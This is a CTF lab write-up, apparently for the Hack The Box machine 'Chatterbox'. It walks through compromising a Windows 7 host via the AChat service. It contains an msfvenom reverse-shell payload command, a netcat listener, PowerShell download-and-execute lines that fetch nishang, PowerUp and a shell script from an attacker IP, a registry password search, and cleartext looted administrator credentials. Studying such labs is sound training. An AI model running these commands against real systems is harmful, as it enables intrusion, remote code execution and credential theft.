# Enumeration 

OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
## open ports

135/tcp   open  msrpc        syn-ack Microsoft Windows RPC                                                                                                   
445/tcp   open  microsoft-ds syn-ack Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)                                          
49152/tcp open  msrpc        syn-ack Microsoft Windows RPC                                                                                                   
49153/tcp open  msrpc        syn-ack Microsoft Windows RPC                                                                                                   
49154/tcp open  msrpc        syn-ack Microsoft Windows RPC                                                                                                   
49155/tcp open  msrpc        syn-ack Microsoft Windows RPC                                                                                                   
49156/tcp open  msrpc        syn-ack Microsoft Windows RPC                                                                                                   
49157/tcp open  msrpc        syn-ack Microsoft Windows RPC                                                                                                   
Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows  

## running full port scan
9256/tcp open  achat   AChat chat system

# Exploitation
## port 9256
![[Pasted image 20230110221329.png]]


# Foothold 
![[Pasted image 20230110221345.png]]
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=9001 -e x86/unicode_mixed  -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```
change payload inside script with the new one
change target ip
![[Pasted image 20230110222051.png]]

start listener 
`nc -lvnp 9001`

![[Pasted image 20230110222207.png]]
upgraded shell by uploading nishang and running it

`powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.2/prettysafe.ps1')"`
# Privesc 

uploading Powerup to the target
`IEX(New-Object Net.WebClient).downloadString('http://10.10.16.2/PowerUp.ps1')`
`Invoke-AllChecks`

![[Pasted image 20230111005102.png]]

also can be found by looking into registries 
`reg query HKLM /f password /t REG_SZ /s`
![[Pasted image 20230110223147.png]]
Looks like password
^chatterboxuser

Trying to spray the creds we got and we are in as Administrator using psexec and we are in as nt authority 

![[Pasted image 20230111011259.png]]
 
# Alternative 
 creds are valid  so we can create a cred variable and get shell this way
```
$SecPass = ConvertTo-SecureString '<password>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('<user>',$SecPass)

# grap reverse shell with powershell
Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadstring('http://10.10.16.2/shell.ps1')" -Credential $cred
```


# Loot

alfred and administrator  [creds](ChatterBox#^chatterboxuser) :
	Username: alfred - administrator 
	Password: Welcome1!



---
Tags: #ctf #HTB #Achat
Resources: [ChatterBox](https://app.hackthebox.com/machines/123) 